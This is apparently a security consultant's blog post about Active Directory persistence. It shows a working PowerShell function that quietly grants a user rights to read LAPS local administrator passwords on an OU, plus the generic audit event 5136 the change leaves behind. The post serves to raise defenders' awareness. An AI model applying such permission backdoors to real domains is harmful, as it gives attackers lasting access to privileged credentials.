---
title: Adding a Backdoor to AD in 400 Milliseconds
description: How fast does it take for an experienced attacker to put a backdoor into your identity system?  The answer is much quicker than you ever imagined.
date : 2020-02-19T00:00:00+04:00
lastmod : 2020-11-10T00:00:00+04:00
tags: ['Security','Active Directory','LAPS']
aliases:
    - /blog/persistence-in-400-milliseconds
---
Persistence is a standard method for attackers to keep their toes inside a target computer system. “Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.” Source

> "Permissions applied in milliseconds?" What's that mean for an environment that's experienced a compromise?
 
Any security device or security system has unique ways attackers apply persistence to remain in control. Attackers use this persistence to allow themselves to return to the system and keep administrative privileges.

 


 
I designed the first release of BadBlood to simulate random Active Directory persistence attacks. Some attacks applied in the first release include

1. LAPS read access
1. Serviceprincipalname controlDerivative domain admin
1. Dssync privileges
1. GPO permission delegation

 

If you decide to test [BadBlood](/badblood), you might choose to run the full domain import, or you might choose to run just a segment of the tool. If you run all the scripts, notice that the full creation of the domain, the OUs, users, groups, computers, permissions, and grouping, takes 30 minutes+. If you decide to test only the part of the script that applies permissions, you'll notice the permissions apply in seconds.

## "Permissions applied in seconds." What does that mean to an environment that's had a compromise?

### An attacker can implant a method of persistence in an active directory in a matter of seconds.

 
If you are breached and you know the attacker gained access to a highly privileged group, the attacker may have implanted a subversive method to hide in your domain even if the attacker only had access for minutes.

BadBlood currently applies persistence attacks randomly. Random users get random permissions on random OUs. If I was an attacker, I could apply any of these persistence attacks to a domain in under 10 seconds.

My last few [Red forest posts](/redforest/phase1/laps) are on LAPS, so I'll start by simulating a LAPS Persistence Attack

I can add LAPS permissions into the domain in under one second. Literally 396 milliseconds. Attackers can have a backdoor into your domain in under 400 ***MILLI***iseconds!  Thats 4/10ths of a second! 

![Attack Persistence in 398 milliseconds](images/persistence1.png?classes=shadow&width=60pc)

"But the attacker was only in my system for 4 minutes! It's ok!"  

Is it?... Is it really.  I can add a smorgasbord of backdoors in 4 minutes.

Boomsauce Below:
```powershell
function ApplyPersistenceLAPS {
    ## Create guidmap for acl functions
    cd ad:
    #================
    #Get a reference to the RootDSE of the current domain
    $schemaPath = (Get-ADRootDSE)
    #Get a reference to the current domain
    $domain = Get-ADDomain
    #============================
    #Create a hashtable to store the GUID value of each schema class and attribute
    $guidmap = @{ }
    Get-ADObject -SearchBase ($schemaPath.SchemaNamingContext) -LDAPFilter `
    "(schemaidguid=*)" -Properties lDAPDisplayName, schemaIDGUID |
        % { $guidmap[$_.lDAPDisplayName] = [System.GUID]$_.schemaIDGUID }
    #Create a hashtable to store the GUID value of each extended right in the forest
    $extendedrightsmap = @{ }
    Get-ADObject -SearchBase ($schemaPath.ConfigurationNamingContext) -LDAPFilter `
    "(&(objectclass=controlAccessRight)(rightsguid=*))" -Properties displayName, rightsGuid |
        % { $extendedrightsmap[$_.displayName] = [System.GUID]$_.rightsGuid }
    Function ReadComputerAdmPwd($objGroup, $objOU, $inheritanceType)
    {
    $error.Clear()
        $groupSID = New-Object System.Security.Principal.SecurityIdentifier $objGroup.SID
        $objAcl = get-acl $objOU
        $objAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $groupSID, "ReadProperty", "Allow", $guidmap["ms-Mcs-AdmPwd"], $inheritanceType, $guidmap["computer"]))
        $objAcl.AddAccessRule((New-Object System.DirectoryServices.ActiveDirectoryAccessRule $groupSID, "ExtendedRight", "Allow", $inheritanceType, $guidmap["computer"]))
        try
        {
           Set-Acl -AclObject $objAcl -path $objOU
        }
        catch
        {
            Write-Host -ForegroundColor Red ("ERROR: Unable to grant the group " + $objGroup.Name + " permissions to read local administrator password on OU" + $objOU)
        }
        If (!$error)
        {
            Write-Host -ForegroundColor Green ("INFORMATION: Granted the group " + $objGroup.Name + " permissions to read local administrator password on OU " + $objOU)
        }
    }
    $user = Get-aduser lillie_gardner
    $ou = Get-ADOrganizationalUnit 'OU=TEMP,OU=LAPS Testing,DC=badblood,DC=com'
    $in = 'Descendents'
    ReadcomputerAdmPwd -objGroup $user -objOU $ou -inheritanceType $in
}

ApplyPersistenceLAPS
```
 
Simply because this code may be new to you, doesn't mean the code isn’t already in the hands of well funded attackers.

Is not as simple to reverse the effects of an attacker. If you happen to have AD auditing on, and if you happen to audit permission changes on all sub OUs, guide here, searching for these events in real time or post incident is a bit mundane and tiresome.

There are no specific permissions identified in the alert. The record shows a very generic event.

Category: Directory Service Changes
Description: A directory service object was modified.
 

Here is a generating event on the DC

```
Log Name:      Security
Source:        Microsoft-Windows-Security-Auditing
Date:          2/3/2020 9:44:39 PM
Event ID:      5136
Task Category: Directory Service Changes
Level:         Information
Keywords:      Audit Success
User:          N/A
Computer:      BadBlood-dc1.badblood.com
Description:
A directory service object was modified.
	
Subject:
	Security ID:		BADBLOOD\Administrator
	Account Name:		Administrator
	Account Domain:		BADBLOOD
	Logon ID:		0x7EDDD

Directory Service:
	Name:	badblood.com
	Type:	Active Directory Domain Services
	
Object:
	DN:	OU=TEMP,OU=LAPS Testing,DC=badblood,DC=com
	GUID:	OU=TEMP,OU=LAPS Testing,DC=badblood,DC=com
	Class:	organizationalUnit
	
Attribute:
	LDAP Display Name:	nTSecurityDescriptor
	Syntax (OID):	2.5.5.15
	Value:	O:DAG:DAD:AI(OA;CIIO;RP;22bd1261-c0e6-4142-842f-f5c7b45066f4;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1622)(OA;CIIO;CR;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1622)(OA;;CCDC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;AO)(OA;;CCDC;bf967a86-0de6-11d0-a285-00aa003049e2;;AO)(OA;;CCDC;bf967a9c-0de6-11d0-a285-00aa003049e2;;AO)(OA;;CCDC;bf967aa8-0de6-11d0-a285-00aa003049e2;;PO)(OA;;CCDC;bf967aba-0de6-11d0-a285-00aa003049e2;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(OA;CIIOID;WP;22bd1261-c0e6-4142-842f-f5c7b45066f4;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RPWP;439ff55a-920d-4135-be5b-8c68d816c95b;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1829396480-2787775631-2601624215-526)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1829396480-2787775631-2601624215-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2325)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2594)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2604)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2608)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-572)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2379)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2393)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2510)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2551)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2563)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2569)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1804)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2579)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1365)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2416)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2433)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2468)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1189)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2020)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2545)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2551)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;DC)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1305)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-572)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2109)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1430)(OA;CIIOID;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-32-562)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;BO)(OA;OICIID;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIID;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-519)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2585)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2608)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-1350)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2147)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2407)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2557)(A;CIID;LC;;;RU)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;BA)S:AI(OU;CIIDSA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CIIDSA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;CIIDSAFA;WPWD;;;WD)
	
Operation:
	Type:	Value Added
	Correlation ID:	{ae6d7478-b30e-4c06-ab98-9bc348278404}
	Application Correlation ID:	-
Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
    <EventID>5136</EventID>
    <Version>0</Version>
    <Level>0</Level>
    <Task>14081</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2020-02-03T19:44:39.728968500Z" />
    <EventRecordID>62663</EventRecordID>
    <Correlation />
    <Execution ProcessID="800" ThreadID="900" />
    <Channel>Security</Channel>
    <Computer>BadBlood-dc1.badblood.com</Computer>
    <Security />
  </System>
  <EventData>
    <Data Name="OpCorrelationID">{ae6d7478-b30e-4c06-ab98-9bc348278404}</Data>
    <Data Name="AppCorrelationID">-</Data>
    <Data Name="SubjectUserSid">S-1-5-21-1829396480-2787775631-2601624215-500</Data>
    <Data Name="SubjectUserName">Administrator</Data>
    <Data Name="SubjectDomainName">BADBLOOD</Data>
    <Data Name="SubjectLogonId">0x7eddd</Data>
    <Data Name="DSName">badblood.com</Data>
    <Data Name="DSType">%%14676</Data>
    <Data Name="ObjectDN">OU=TEMP,OU=LAPS Testing,DC=badblood,DC=com</Data>
    <Data Name="ObjectGUID">{46f59a4c-af4e-42fd-b6c6-ed70f3d96046}</Data>
    <Data Name="ObjectClass">organizationalUnit</Data>
    <Data Name="AttributeLDAPDisplayName">nTSecurityDescriptor</Data>
    <Data Name="AttributeSyntaxOID">2.5.5.15</Data>
    <Data Name="AttributeValue">O:DAG:DAD:AI(OA;CIIO;RP;22bd1261-c0e6-4142-842f-f5c7b45066f4;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1622)(OA;CIIO;CR;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1622)(OA;;CCDC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;AO)(OA;;CCDC;bf967a86-0de6-11d0-a285-00aa003049e2;;AO)(OA;;CCDC;bf967a9c-0de6-11d0-a285-00aa003049e2;;AO)(OA;;CCDC;bf967aa8-0de6-11d0-a285-00aa003049e2;;PO)(OA;;CCDC;bf967aba-0de6-11d0-a285-00aa003049e2;;AO)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(OA;CIIOID;WP;22bd1261-c0e6-4142-842f-f5c7b45066f4;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RPWP;439ff55a-920d-4135-be5b-8c68d816c95b;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1829396480-2787775631-2601624215-526)(OA;CIID;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-1829396480-2787775631-2601624215-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIOID;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2325)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2594)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2604)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2608)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-572)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2379)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2393)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2510)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2551)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2563)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2569)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1804)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2579)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1365)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2416)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2433)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2468)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1189)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2020)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2545)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2551)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;DC)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1305)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-572)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-2109)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-1829396480-2787775631-2601624215-1430)(OA;CIIOID;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIOID;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-32-562)(OA;CIIOID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;bf967a9c-0de6-11d0-a285-00aa003049e2;BO)(OA;OICIID;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIID;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-519)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2585)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2608)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-1350)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2147)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2407)(A;CIID;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1829396480-2787775631-2601624215-2557)(A;CIID;LC;;;RU)(A;CIID;CCLCSWRPWPLOCRSDRCWDWO;;;BA)S:AI(OU;CIIDSA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CIIDSA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;CIIDSAFA;WPWD;;;WD)</Data>
    <Data Name="OperationType">%%14674</Data>
  </EventData>
</Event>
```
 

Good luck finding useful information quickly from this text blog

I’ll dive into additional persistence attacks in later posts, and help push you to identify, eradicate, and block these attacks from happening in your Active Directory. For more information on identifying legacy permission snafus, or to obtain training tailored to your Active Directory environment, please see my services page or reach out to me to get an understanding of the training services I provide.